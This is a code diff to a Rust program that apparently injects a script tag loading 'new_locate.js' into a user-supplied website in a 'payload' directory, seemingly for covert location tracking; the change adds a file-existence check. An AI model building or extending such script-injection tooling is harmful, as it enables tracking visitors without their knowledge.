@@ -4,6 +4,7 @@ use std::fs::OpenOptions;
 use std::io::{Result, Write};
 use std::fs::File;
 use std::io::prelude::*;
+use std::path::PathBuf;
 
 // const APPEND :&str = "<script src=\"new_locate.js\"></script>";
 
@@ -42,11 +43,22 @@ pub fn bind_js_to_html(){
 
 // Code for 2nd option
 pub fn extend_bind(){
-    println!("Check if the custom website saved in payload directory");
+    println!("Check if you have saved your custom website in the payload directory");
     println!("Press any key to continue ...");
+
     std::io::stdin().read_line(&mut String::new()).unwrap();
 
     let html_path = "payload/index.html";
+    
+    println!("Checking if file exists !");
+    if check_if_file_exists(PathBuf::from(&html_path)).is_ok(){
+        println!();
+    }
+    if check_if_file_exists(PathBuf::from(&html_path)).is_err(){
+        println!("[+]Error: File index.html not Found! \nPlease Save your Files at /payload directory and Try again.");
+        std::process::exit(1);
+    }
+    
     let append = "<script src=\"new_locate.js\"></script>";
     let mut file = OpenOptions::new()
         .append(true)
@@ -108,3 +120,18 @@ pub fn check_keys_default(){
         key_store_to_txt_file();
     }
 }
+
+pub fn check_if_file_exists(path: PathBuf) -> anyhow::Result<String>{
+    let mut string = String::new();
+    // let path = "payload/index.html";
+    let mut file: File = match File::open(path){
+        Ok(handle) => handle,
+        Err(error) => return Err(error.into()),
+    };
+
+    match file.read_to_string(&mut string){
+        Ok(_) => (),
+        Err(error) => return Err(error.into()),
+    };
+    Ok(string)
+} 
